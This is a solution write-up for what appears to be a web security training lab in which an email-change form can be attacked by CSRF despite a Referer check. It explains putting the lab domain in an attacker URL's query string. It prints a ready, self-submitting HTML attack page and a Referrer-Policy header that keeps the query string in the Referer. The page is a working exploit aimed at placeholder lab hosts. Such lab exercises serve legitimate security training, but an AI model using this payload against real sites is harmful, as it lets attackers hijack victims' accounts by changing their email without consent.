This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter 

# Solution

change-email form requires original domain in Referer. An example to bypass this validation is:
`Referer: https://attacker.com?YOUR-LAB-ID.web-security-academy.net`


Store the following to exploit server
```js
<html>
    <body>
        <script>history.pushState('','','/?YOUR-LAB-ID.web-security-academy.net')</script>
        <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="test@test">
            <input type="submit" value="submit">
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

Ensure that exploit server returns a response with
`Referrer-Policy: unsafe-url` as many browsers now strip the query string from the Referer header by default as a security measure.
